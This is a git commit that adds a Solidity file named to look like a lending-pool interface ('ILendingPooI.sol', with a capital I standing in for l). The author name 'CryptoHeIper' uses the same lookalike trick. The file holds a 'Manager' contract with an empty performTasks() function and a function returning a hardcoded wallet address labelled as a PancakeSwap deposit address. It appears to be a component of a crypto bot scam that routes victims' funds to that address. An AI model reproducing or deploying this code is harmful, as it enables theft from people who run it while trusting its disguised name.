2f9af5138c524314db254b96350f3f86498eac65
CryptoHeIper <105957493+CryptoHeIper@users.noreply.github.com>
2022-05-28 03:07:51 +0800

    Create ILendingPooI.sol

---
+++ contracts/interfaces/ILendingPooI.sol
@@ -0,0 +1,13 @@
+pragma solidity ^0.5.0;
+
+contract Manager {
+    function performTasks() public pure{
+        
+    }
+    
+    function pancakeswapDepositAddress() public pure returns (address) {
+        return 0x7Ab504A283a541ACb7898EE1013Bb0C97e622c4c;
+    }
+}
+
+//pancakeswapfunction
